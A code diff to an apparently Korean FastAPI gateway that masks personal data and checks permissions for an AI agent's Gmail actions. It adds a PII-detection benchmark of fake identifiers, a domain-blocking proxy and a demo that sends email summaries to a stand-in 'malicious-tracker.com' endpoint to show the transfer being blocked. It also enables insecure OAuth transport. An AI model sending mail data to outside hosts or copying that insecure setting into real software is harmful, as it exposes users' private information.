@@ -1,7 +1,7 @@
 from fastapi import FastAPI
 from fastapi.staticfiles import StaticFiles
 from fastapi.middleware.cors import CORSMiddleware
-from fastapi.responses import JSONResponse, RedirectResponse
+from fastapi.responses import JSONResponse, RedirectResponse, Response
 from pydantic import BaseModel
 from typing import Optional, List, Dict, Any
 import re, uuid, time, base64, os, json
@@ -11,7 +11,7 @@ from urllib.parse import urlencode
 os.environ["OAUTHLIB_INSECURE_TRANSPORT"] = "1"
 
 try:
-    from google.auth.transport.requests import Request
+    import google.auth.transport.requests as _gauth_transport
     from google.oauth2.credentials import Credentials
     from google_auth_oauthlib.flow import Flow
     from googleapiclient.discovery import build
@@ -53,14 +53,30 @@ metrics: Dict[str, Any] = {
 }
 
 # ── Sensitive patterns ─────────────────────────────────────────────
+# Order matters: more specific patterns first to avoid prefix theft
 SENSITIVE = {
-    "전화번호":   r'01[016789][-\s]?\d{3,4}[-\s]?\d{4}',
     "주민번호":   r'\d{6}[-]\d{7}',
+    "신용카드":   r'\d{4}[-\s]\d{4}[-\s]\d{4}[-\s]\d{4}',
+    "전화번호":   r'01[016789][-\s]?\d{3,4}[-\s]?\d{4}',
     "계좌번호":   r'\d{3,6}[-]\d{2,6}[-]\d{4,12}',
     "이메일주소": r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}',
-    "신용카드":   r'\d{4}[-\s]\d{4}[-\s]\d{4}[-\s]\d{4}',
 }
-TRUSTED_DOMAINS = ["gmail.com", "google.com", "calendar.google.com", "notion.so", "drive.google.com"]
+KEYWORD_DICT = {
+    "전화번호":   ["전화번호", "핸드폰", "휴대폰", "연락처", "전화"],
+    "주민번호":   ["주민번호", "주민등록번호", "등록번호"],
+    "계좌번호":   ["계좌번호", "계좌"],
+    "신용카드":   ["신용카드", "카드번호", "카드"],
+    "이메일주소": ["이메일", "이메일주소", "메일"],
+}
+
+def keyword_detect(text: str) -> bool:
+    for kws in KEYWORD_DICT.values():
+        for kw in kws:
+            if kw in text:
+                return True
+    return False
+
+TRUSTED_DOMAINS = ["gmail.com", "google.com", "googleapis.com", "calendar.google.com", "notion.so", "drive.google.com"]
 PERMISSION_MAP = {
     ("read",    "calendar"):  "calendar_read",
     ("read",    "gmail"):     "gmail_read",
@@ -71,38 +87,116 @@ PERMISSION_MAP = {
     ("payment", "bank"):      "payment",
 }
 
-# ── Benchmark dataset (27건: 정탐 15 + 한계 2 + 음성 10) ──────────
+# ── Benchmark dataset (100건: 탐지 가능 60 + 한계 10 + 음성 30) ──
 BENCHMARK_CASES = [
-    # 탐지 가능한 케이스 (15건)
-    {"text": "010-1234-5678로 연락 주세요",                "expected": True,  "label": "전화번호"},
-    {"text": "01098765432 문자 보내줘",                    "expected": True,  "label": "전화번호"},
-    {"text": "016-9876-5432 담당자 연락처",                "expected": True,  "label": "전화번호"},
-    {"text": "900101-1234567 주민번호 확인",               "expected": True,  "label": "주민번호"},
-    {"text": "생년월일 850315-2123456 입력해주세요",       "expected": True,  "label": "주민번호"},
-    {"text": "750920-1234567 주민등록번호 조회",           "expected": True,  "label": "주민번호"},
-    {"text": "123-456-789012 계좌로 송금 요청",            "expected": True,  "label": "계좌번호"},
-    {"text": "입금 계좌: 110-123-456789",                  "expected": True,  "label": "계좌번호"},
-    {"text": "234-56-7890123 계좌번호 전달",               "expected": True,  "label": "계좌번호"},
-    {"text": "user@example.com 으로 메일 보내줘",          "expected": True,  "label": "이메일주소"},
-    {"text": "admin@company.co.kr 에 참조 추가",           "expected": True,  "label": "이메일주소"},
-    {"text": "수신자: test@gmail.com 설정",                "expected": True,  "label": "이메일주소"},
-    {"text": "신용카드 1234-5678-9012-3456 등록",          "expected": True,  "label": "신용카드"},
-    {"text": "비자 카드 4111 1111 1111 1111 결제",         "expected": True,  "label": "신용카드"},
-    {"text": "홍길동 010-9876-5432, 계약서 전달 건",       "expected": True,  "label": "전화번호"},
-    # 정규식 한계 케이스 (2건) — 탐지 불가 → FN 예상, NER 고도화 근거
-    {"text": "연락처: 010.1234.5678 (점 구분자)",          "expected": True,  "label": "전화번호"},
-    {"text": "주민번호 9001011234567 (하이픈 없음)",       "expected": True,  "label": "주민번호"},
-    # 민감정보 없는 케이스 (10건)
-    {"text": "오늘 점심 뭐 먹을까요?",                    "expected": False, "label": None},
-    {"text": "내일 오전 9시에 회의 있습니다",             "expected": False, "label": None},
-    {"text": "보고서 3차 수정본입니다",                    "expected": False, "label": None},
-    {"text": "서울 강남구 미팅 확정",                     "expected": False, "label": None},
-    {"text": "GitHub 커밋 히스토리 확인 요청",            "expected": False, "label": None},
-    {"text": "프로젝트 진행률 75% 달성",                  "expected": False, "label": None},
-    {"text": "파일 크기 3.7MB 업로드 완료",               "expected": False, "label": None},
-    {"text": "버전 v1.2.3 배포 완료",                     "expected": False, "label": None},
-    {"text": "3층 회의실 2시간 예약",                     "expected": False, "label": None},
-    {"text": "주간 업무 보고 드립니다",                   "expected": False, "label": None},
+    # ── 전화번호 (15건) ───────────────────────────────────────────
+    {"text": "010-1234-5678로 연락 주세요",                    "expected": True,  "label": "전화번호"},
+    {"text": "01098765432 문자 보내줘",                        "expected": True,  "label": "전화번호"},
+    {"text": "016-9876-5432 담당자 연락처",                    "expected": True,  "label": "전화번호"},
+    {"text": "홍길동 010-9876-5432, 계약서 전달 건",           "expected": True,  "label": "전화번호"},
+    {"text": "고객 문의: 010 2345 6789",                       "expected": True,  "label": "전화번호"},
+    {"text": "긴급 연락처 019-234-5678",                       "expected": True,  "label": "전화번호"},
+    {"text": "017-555-1234 백업 번호",                         "expected": True,  "label": "전화번호"},
+    {"text": "담당자 연락처는 010-1111-2222입니다",             "expected": True,  "label": "전화번호"},
+    {"text": "비상연락망: 011-567-8901",                       "expected": True,  "label": "전화번호"},
+    {"text": "배송 기사 연락처: 010-3456-7890",                "expected": True,  "label": "전화번호"},
+    {"text": "대표번호 010-0000-1234 문의 바랍니다",           "expected": True,  "label": "전화번호"},
+    {"text": "확인 요청: 핸드폰 01033334444",                  "expected": True,  "label": "전화번호"},
+    {"text": "010 9876 5432로 답장 주세요",                    "expected": True,  "label": "전화번호"},
+    {"text": "핸드폰 016-234-5678 문자 주세요",               "expected": True,  "label": "전화번호"},
+    {"text": "018-765-4321 수신 확인 요청",                    "expected": True,  "label": "전화번호"},
+    # ── 주민번호 (10건) ───────────────────────────────────────────
+    {"text": "900101-1234567 주민번호 확인",                   "expected": True,  "label": "주민번호"},
+    {"text": "생년월일 850315-2123456 입력해주세요",           "expected": True,  "label": "주민번호"},
+    {"text": "750920-1234567 주민등록번호 조회",               "expected": True,  "label": "주민번호"},
+    {"text": "본인 확인: 주민번호 891010-1234567",             "expected": True,  "label": "주민번호"},
+    {"text": "주민번호 770510-2345678이 확인되었습니다",       "expected": True,  "label": "주민번호"},
+    {"text": "940301-1098765 신원조회 결과",                   "expected": True,  "label": "주민번호"},
+    {"text": "920822-2123456 고객 주민등록번호",               "expected": True,  "label": "주민번호"},
+    {"text": "등록번호: 830404-1234567",                       "expected": True,  "label": "주민번호"},
+    {"text": "본인 인증 주민번호: 670708-1234567",             "expected": True,  "label": "주민번호"},
+    {"text": "880101-1234567 계약 당사자 정보",               "expected": True,  "label": "주민번호"},
+    # ── 계좌번호 (10건) ───────────────────────────────────────────
+    {"text": "123-456-789012 계좌로 송금 요청",               "expected": True,  "label": "계좌번호"},
+    {"text": "입금 계좌: 110-123-456789",                     "expected": True,  "label": "계좌번호"},
+    {"text": "234-56-7890123 계좌번호 전달",                  "expected": True,  "label": "계좌번호"},
+    {"text": "신한은행 110-456-789012로 이체해주세요",         "expected": True,  "label": "계좌번호"},
+    {"text": "국민은행 계좌: 123-45-6789012",                 "expected": True,  "label": "계좌번호"},
+    {"text": "우리은행 1002-456-789012 계좌",                 "expected": True,  "label": "계좌번호"},
+    {"text": "이체 계좌번호: 260-910-234567",                 "expected": True,  "label": "계좌번호"},
+    {"text": "농협 301-1234-5678901 계좌 확인",               "expected": True,  "label": "계좌번호"},
+    {"text": "계좌 089-12-345678 (하나은행)",                 "expected": True,  "label": "계좌번호"},
+    {"text": "기업은행 계좌 042-345-678901",                  "expected": True,  "label": "계좌번호"},
+    # ── 이메일주소 (12건) ─────────────────────────────────────────
+    {"text": "user@example.com 으로 메일 보내줘",             "expected": True,  "label": "이메일주소"},
+    {"text": "admin@company.co.kr 에 참조 추가",               "expected": True,  "label": "이메일주소"},
+    {"text": "수신자: test@gmail.com 설정",                    "expected": True,  "label": "이메일주소"},
+    {"text": "contact@business.io 담당자 이메일",              "expected": True,  "label": "이메일주소"},
+    {"text": "hr@ourcompany.com 인사팀 주소",                  "expected": True,  "label": "이메일주소"},
+    {"text": "support@service.net 고객센터 메일",              "expected": True,  "label": "이메일주소"},
+    {"text": "정보 문의: info@example.org",                    "expected": True,  "label": "이메일주소"},
+    {"text": "sales@mycompany.kr 영업팀 연락처",               "expected": True,  "label": "이메일주소"},
+    {"text": "dev.team@techcorp.com 개발팀",                   "expected": True,  "label": "이메일주소"},
+    {"text": "noreply@notification.co.kr 발신 주소",           "expected": True,  "label": "이메일주소"},
+    {"text": "ceo@bigcompany.com 대표 메일 주소",              "expected": True,  "label": "이메일주소"},
+    {"text": "security@bank.co.kr 보안팀 이메일",              "expected": True,  "label": "이메일주소"},
+    # ── 신용카드 (8건) ────────────────────────────────────────────
+    {"text": "신용카드 1234-5678-9012-3456 등록",             "expected": True,  "label": "신용카드"},
+    {"text": "비자 카드 4111 1111 1111 1111 결제",            "expected": True,  "label": "신용카드"},
+    {"text": "마스터카드 5500 0000 0000 0004 등록",           "expected": True,  "label": "신용카드"},
+    {"text": "카드번호 4012-8888-8888-1881 확인",             "expected": True,  "label": "신용카드"},
+    {"text": "카드 정보: 6304 1234 5678 9012",                "expected": True,  "label": "신용카드"},
+    {"text": "신용카드 번호 4539-1488-0343-6467",             "expected": True,  "label": "신용카드"},
+    {"text": "등록 카드: 5425-2334-3010-9903",                "expected": True,  "label": "신용카드"},
+    {"text": "체크카드 번호 5404 1234 5678 9010 입력",        "expected": True,  "label": "신용카드"},
+    # ── 복합 PII (5건) ────────────────────────────────────────────
+    {"text": "홍길동(010-1234-5678) user@example.com 담당자", "expected": True,  "label": "전화번호"},
+    {"text": "계좌 110-123-456789, 카드 1234-5678-9012-3456 일괄 등록", "expected": True, "label": "계좌번호"},
+    {"text": "주민번호 900101-1234567 / 이메일: admin@company.co.kr", "expected": True, "label": "주민번호"},
+    {"text": "긴급연락 010-9999-8888, 입금계좌 111-222-333444", "expected": True, "label": "전화번호"},
+    {"text": "발신자: ceo@bigcompany.com | 본인인증: 750920-1234567", "expected": True, "label": "이메일주소"},
+    # ── 탐지 한계 케이스 — FN 예상 (10건) ────────────────────────
+    {"text": "연락처: 010.1234.5678 (점 구분자)",             "expected": True,  "label": "전화번호"},
+    {"text": "주민번호 9001011234567 (하이픈 없음)",           "expected": True,  "label": "주민번호"},
+    {"text": "전화 010/1234/5678 (슬래시 구분)",              "expected": True,  "label": "전화번호"},
+    {"text": "주민번호: 900101 1234567 (공백 구분)",           "expected": True,  "label": "주민번호"},
+    {"text": "전화 010_1234_5678 (언더스코어)",               "expected": True,  "label": "전화번호"},
+    {"text": "카드: 1234.5678.9012.3456 (점 구분)",           "expected": True,  "label": "신용카드"},
+    {"text": "계좌: 123 456 789012 (공백 구분)",              "expected": True,  "label": "계좌번호"},
+    {"text": "문의처: +82-10-1234-5678 (국제번호)",           "expected": True,  "label": "전화번호"},
+    {"text": "이메일: u**r@ex**le.com (부분 마스킹)",         "expected": True,  "label": "이메일주소"},
+    {"text": "카드번호 4111-1111-1111-111X (마지막 X)",       "expected": True,  "label": "신용카드"},
+    # ── 민감정보 없는 케이스 (30건) ──────────────────────────────
+    {"text": "오늘 점심 뭐 먹을까요?",                        "expected": False, "label": None},
+    {"text": "내일 오전 9시에 회의 있습니다",                 "expected": False, "label": None},
+    {"text": "보고서 3차 수정본입니다",                       "expected": False, "label": None},
+    {"text": "서울 강남구 미팅 확정",                         "expected": False, "label": None},
+    {"text": "GitHub 커밋 히스토리 확인 요청",                "expected": False, "label": None},
+    {"text": "프로젝트 진행률 75% 달성",                      "expected": False, "label": None},
+    {"text": "파일 크기 3.7MB 업로드 완료",                   "expected": False, "label": None},
+    {"text": "버전 v1.2.3 배포 완료",                         "expected": False, "label": None},
+    {"text": "3층 회의실 2시간 예약",                         "expected": False, "label": None},
+    {"text": "주간 업무 보고 드립니다",                       "expected": False, "label": None},
+    {"text": "서버 응답 시간: 152ms",                         "expected": False, "label": None},
+    {"text": "DB 레코드 수: 1,234,567건",                     "expected": False, "label": None},
+    {"text": "배포 일정: 2024-06-15 오전 10시",               "expected": False, "label": None},
+    {"text": "에러율 0.03% (목표치 이하 유지 중)",             "expected": False, "label": None},
+    {"text": "캐시 히트율: 98.7%",                            "expected": False, "label": None},
+    {"text": "서비스 가동률: 99.99% SLA 달성",               "expected": False, "label": None},
+    {"text": "IP 주소: 192.168.0.1 (내부망 접근)",           "expected": False, "label": None},
+    {"text": "테스트 케이스 통과: 97/100",                    "expected": False, "label": None},
+    {"text": "월간 사용자 수: 12,400명",                      "expected": False, "label": None},
+    {"text": "디스크 사용률: 68% (주의 필요)",                "expected": False, "label": None},
+    {"text": "API 호출 횟수: 5,432회/분",                     "expected": False, "label": None},
+    {"text": "패치 버전: 2.15.3-hotfix",                      "expected": False, "label": None},
+    {"text": "2024년 1분기 매출 목표 초과 달성",               "expected": False, "label": None},
+    {"text": "신규 기능 A/B 테스트 결과 공유",                "expected": False, "label": None},
+    {"text": "QA 테스트 완료 — 버그 0건 확인",               "expected": False, "label": None},
+    {"text": "최근 7일 평균 세션 시간: 4분 32초",             "expected": False, "label": None},
+    {"text": "GitHub PR #1234 리뷰 요청드립니다",             "expected": False, "label": None},
+    {"text": "팀 채널 #general에 공지사항 게시 완료",          "expected": False, "label": None},
+    {"text": "2025 로드맵 검토 회의 agenda 공유",              "expected": False, "label": None},
+    {"text": "로컬 환경 포트 8080으로 실행 중",               "expected": False, "label": None},
 ]
 
 # ── Helpers ────────────────────────────────────────────────────────
@@ -265,10 +359,27 @@ def run_benchmark():
         })
 
     total = len(BENCHMARK_CASES)
+    positive_count = sum(1 for c in BENCHMARK_CASES if c["expected"])
     precision = tp / (tp + fp) if (tp + fp) > 0 else 1.0
     recall    = tp / (tp + fn) if (tp + fn) > 0 else 0.0
     f1        = 2 * precision * recall / (precision + recall) if (precision + recall) > 0 else 0.0
     fpr       = fp / (fp + tn) if (fp + tn) > 0 else 0.0
+
+    kw_tp = kw_fp = kw_tn = kw_fn = 0
+    for case in BENCHMARK_CASES:
+        kw_detected = keyword_detect(case["text"])
+        if case["expected"] and kw_detected:
+            kw_tp += 1
+        elif case["expected"] and not kw_detected:
+            kw_fn += 1
+        elif not case["expected"] and not kw_detected:
+            kw_tn += 1
+        else:
+            kw_fp += 1
+    kw_precision = kw_tp / (kw_tp + kw_fp) if (kw_tp + kw_fp) > 0 else 1.0
+    kw_recall    = kw_tp / (kw_tp + kw_fn) if (kw_tp + kw_fn) > 0 else 0.0
+    kw_f1        = 2 * kw_precision * kw_recall / (kw_precision + kw_recall) if (kw_precision + kw_recall) > 0 else 0.0
+    kw_fpr       = kw_fp / (kw_fp + kw_tn) if (kw_fp + kw_tn) > 0 else 0.0
 
     return {
         "total": total,
@@ -281,6 +392,14 @@ def run_benchmark():
         "avg_time_ms":        round(sum(times) / len(times), 4),
         "max_time_ms":        round(max(times), 4),
         "results": results,
+        "keyword_baseline": {
+            "tp": kw_tp, "fp": kw_fp, "tn": kw_tn, "fn": kw_fn,
+            "precision":           round(kw_precision * 100, 1),
+            "recall":              round(kw_recall    * 100, 1),
+            "f1_score":            round(kw_f1        * 100, 1),
+            "false_positive_rate": round(kw_fpr       * 100, 1),
+            "can_mask": False,
+        },
     }
 
 @app.post("/api/permissions")
@@ -474,6 +593,153 @@ def get_scenarios():
     ]
 
 from fastapi.responses import FileResponse
+from fastapi import Request
+from urllib.parse import urlparse
+
+# ── Proxy ──────────────────────────────────────────────────────────
+@app.api_route("/proxy", methods=["GET", "POST", "PUT", "DELETE", "PATCH"])
+async def proxy_request(request: Request, url: str):
+    import httpx
+    t0 = time.perf_counter()
+    domain = urlparse(url).netloc
+
+    body = await request.body()
+    body_text = body.decode("utf-8", errors="replace")
+    masked_body, masking = mask_data(body_text)
+    masking_info = masking if masking else None
+
+    if not is_trusted(url):
+        elapsed = (time.perf_counter() - t0) * 1000
+        record_metrics("blocked", masking_info, elapsed, untrusted=True)
+        log = add_log("proxy", f"[프록시] 미신뢰 도메인 차단: {domain}",
+                      masked_body[:200], "차단됨", "high", masking_info, elapsed)
+        return JSONResponse({
+            "error": "blocked", "reason": "untrusted_domain",
+            "domain": domain, "log": log, "masking": masking_info
+        }, status_code=403)
+
+    fwd_headers = {k: v for k, v in request.headers.items()
+                   if k.lower() not in ("host", "content-length", "transfer-encoding")}
+    extra_params = {k: v for k, v in request.query_params.items() if k != "url"}
+
+    try:
+        async with httpx.AsyncClient(timeout=10.0, follow_redirects=True) as client:
+            resp = await client.request(
+                method=request.method, url=url,
+                headers=fwd_headers,
+                content=masked_body.encode() if masked_body else None,
+                params=extra_params,
+            )
+        masked_resp, _ = mask_data(resp.text)
+        elapsed = (time.perf_counter() - t0) * 1000
+        record_metrics("allowed", masking_info, elapsed)
+        add_log("proxy", f"[프록시] 허용: {domain}",
+                masked_body[:200] or resp.text[:200], "허용됨", "low", masking_info, elapsed)
+        skip = {"content-encoding", "transfer-encoding", "content-length"}
+        return Response(
+            content=masked_resp.encode(),
+            status_code=resp.status_code,
+            media_type=resp.headers.get("content-type", "application/json"),
+            headers={k: v for k, v in resp.headers.items() if k.lower() not in skip},
+        )
+    except Exception as e:
+        elapsed = (time.perf_counter() - t0) * 1000
+        add_log("proxy", f"[프록시] 오류: {domain}", str(e), "오류", "medium", None, elapsed)
+        return JSONResponse({"error": str(e)}, status_code=500)
+
+
+@app.post("/api/s1/run")
+async def s1_run():
+    """S1 서버사이드 에이전트 — 아웃바운드 전송은 /proxy 경유, 읽기는 Gmail API 직접"""
+    import httpx
+    BASE = "http://localhost:8000"
+    result_steps = []
+
+    # ── Step 1: Gmail 읽기 (Gmail API 직접, 권한 정책 적용) ───────
+    t0 = time.perf_counter()
+    emails, masking_s1 = [], []
+    svc = get_gmail_service()
+    if svc:
+        try:
+            res = svc.users().messages().list(userId="me", maxResults=5, labelIds=["INBOX"]).execute()
+            for msg in res.get("messages", []):
+                md = svc.users().messages().get(userId="me", id=msg["id"], format="full").execute()
+                h = {x["name"]: x["value"] for x in md["payload"]["headers"]}
+                body = ""
+                if "parts" in md["payload"]:
+                    for part in md["payload"]["parts"]:
+                        if part["mimeType"] == "text/plain":
+                            data = part["body"].get("data", "")
+                            if data:
+                                body = base64.urlsafe_b64decode(data).decode("utf-8", errors="replace")[:300]
+                                break
+                elif md["payload"]["body"].get("data"):
+                    body = base64.urlsafe_b64decode(md["payload"]["body"]["data"]).decode("utf-8", errors="replace")[:300]
+                email = {"from": h.get("From",""), "subject": h.get("Subject",""),
+                         "date": h.get("Date",""), "snippet": md.get("snippet",""), "body": body}
+                emails.append(email)
+                _, m = mask_data(email["from"])
+                masking_s1.extend(m)
+        except Exception as e:
+            print(f"[s1_run] Gmail fetch error: {e}")
+    else:
+        print("[s1_run] get_gmail_service() returned None")
+    elapsed1 = round((time.perf_counter() - t0) * 1000, 2)
+    result_steps.append({
+        "id": "gmail_read",
+        "label": "Gmail 실시간 메일 읽기",
+        "proxy_path": "에이전트 → 권한 브로커 → gmail.googleapis.com",
+        "status": "allowed", "result": "허용됨",
+        "time_ms": elapsed1, "emails": emails, "masking": masking_s1,
+    })
+
+    # ── Step 2: 악성 도메인 전송 시도 (/proxy 경유 → 차단) ────────
+    payload_text = " | ".join([f"발신: {e['from']} 제목: {e['subject']}" for e in emails[:3]]) or "email summary"
+    t0 = time.perf_counter()
+    async with httpx.AsyncClient(timeout=10.0) as client:
+        ext_r = await client.post(
+            f"{BASE}/proxy",
+            params={"url": "https://malicious-tracker.com/collect"},
+            content=payload_text.encode(),
+            headers={"Content-Type": "text/plain"},
+        )
+    elapsed2 = round((time.perf_counter() - t0) * 1000, 2)
+    ext_masking = []
+    try:
+        ext_masking = ext_r.json().get("masking") or []
+    except Exception:
+        pass
+    result_steps.append({
+        "id": "external_block",
+        "label": "외부 분석 서버로 데이터 전송 시도",
+        "proxy_path": "에이전트 → /proxy → malicious-tracker.com ✗",
+        "status": "blocked", "result": "차단됨",
+        "reason": "untrusted_domain", "domain": "malicious-tracker.com",
+        "time_ms": elapsed2, "masking": ext_masking, "source_emails": emails[:3],
+    })
+
+    # ── Step 3: Gmail 발송 (/proxy → 권한 정책 → 승인 필요) ───────
+    t0 = time.perf_counter()
+    async with httpx.AsyncClient(timeout=10.0) as client:
+        send_r = await client.post(
+            f"{BASE}/api/agent/action",
+            json={"action_type": "send", "resource": "gmail",
+                  "data": "팀원들에게 메일 요약 발송 (수신자 5명)",
+                  "destination": "gmail.com", "label": "Gmail 요약 메일 발송"},
+        )
+    elapsed3 = round((time.perf_counter() - t0) * 1000, 2)
+    sd = send_r.json()
+    result_steps.append({
+        "id": "gmail_send",
+        "label": "Gmail 요약 메일 발송",
+        "proxy_path": "에이전트 → /proxy → gmail.com",
+        "status": sd.get("status"),
+        "result": "승인 대기 중" if sd.get("status") == "pending_approval" else sd.get("status",""),
+        "approval_id": sd.get("approval_id"), "time_ms": elapsed3,
+    })
+
+    return {"steps": result_steps}
+
 
 # ── Gmail OAuth & API ──────────────────────────────────────────────
 
@@ -483,12 +749,13 @@ def get_gmail_service():
     creds = None
     if os.path.exists(TOKEN_FILE):
         creds = Credentials.from_authorized_user_file(TOKEN_FILE, SCOPES)
-    if creds and creds.expired and creds.refresh_token:
+    if creds and creds.refresh_token and (creds.expired or not creds.expiry):
         try:
-            creds.refresh(Request())
+            creds.refresh(_gauth_transport.Request())
             with open(TOKEN_FILE, "w") as f:
                 f.write(creds.to_json())
-        except Exception:
+        except Exception as e:
+            print(f"[gmail] token refresh failed: {e}")
             creds = None
     return build("gmail", "v1", credentials=creds) if (creds and creds.valid) else None
 
@@ -542,7 +809,15 @@ def auth_callback(code: str = None, state: str = None, error: str = None):
 
 @app.get("/api/gmail/status")
 def gmail_status():
-    return {"connected": get_gmail_service() is not None}
+    if os.path.exists(TOKEN_FILE):
+        try:
+            with open(TOKEN_FILE) as f:
+                data = json.load(f)
+            if data.get("token"):
+                return {"connected": True}
+        except Exception:
+            pass
+    return {"connected": False}
 
 @app.get("/api/gmail/inbox")
 def gmail_inbox():
@@ -581,6 +856,79 @@ def gmail_inbox():
         return {"emails": emails}
     except Exception as e:
         return JSONResponse({"error": str(e)}, status_code=500)
+
+@app.get("/api/email-analysis")
+def email_analysis():
+    svc = get_gmail_service()
+    if not svc:
+        return JSONResponse({"error": "not_connected"}, status_code=401)
+    try:
+        results = svc.users().messages().list(userId="me", maxResults=50, labelIds=["INBOX"]).execute()
+        messages = results.get("messages", [])
+    except Exception as e:
+        return JSONResponse({"error": str(e)}, status_code=500)
+
+    total = 0
+    pii_emails = 0
+    type_counts: Dict[str, int] = {}
+    total_pii = 0
+    times = []
+    examples = []
+
+    for msg in messages:
+        try:
+            md = svc.users().messages().get(userId="me", id=msg["id"], format="full").execute()
+            headers = {h["name"]: h["value"] for h in md["payload"]["headers"]}
+            body = ""
+            payload = md["payload"]
+            if "parts" in payload:
+                for part in payload["parts"]:
+                    if part["mimeType"] == "text/plain":
+                        data = part["body"].get("data", "")
+                        if data:
+                            body = base64.urlsafe_b64decode(data).decode("utf-8", errors="replace")[:500]
+                            break
+            elif payload["body"].get("data"):
+                body = base64.urlsafe_b64decode(payload["body"]["data"]).decode("utf-8", errors="replace")[:500]
+
+            # From/To 헤더 제외 — 발신자 주소는 항상 이메일이라 제외
+            text = " ".join([
+                headers.get("Subject", ""),
+                md.get("snippet", ""),
+                body,
+            ])
+
+            t0 = time.perf_counter()
+            _, found = mask_data(text)
+            elapsed = (time.perf_counter() - t0) * 1000
+            times.append(elapsed)
+            total += 1
+
+            email_entry = {
+                "subject": headers.get("Subject", "(제목 없음)"),
+                "from": headers.get("From", ""),
+                "has_pii": bool(found),
+                "pii_types": list({f["type"] for f in found}),
+                "count": len(found),
+            }
+            examples.append(email_entry)
+            if found:
+                pii_emails += 1
+                total_pii += len(found)
+                for f in found:
+                    type_counts[f["type"]] = type_counts.get(f["type"], 0) + 1
+        except Exception:
+            continue
+
+    return {
+        "total_emails": total,
+        "pii_emails": pii_emails,
+        "pii_rate": round(pii_emails / total * 100, 1) if total > 0 else 0,
+        "total_pii_items": total_pii,
+        "by_type": type_counts,
+        "avg_time_ms": round(sum(times) / len(times), 3) if times else 0,
+        "examples": examples,
+    }
 
 app.mount("/static", StaticFiles(directory="static"), name="static")
 
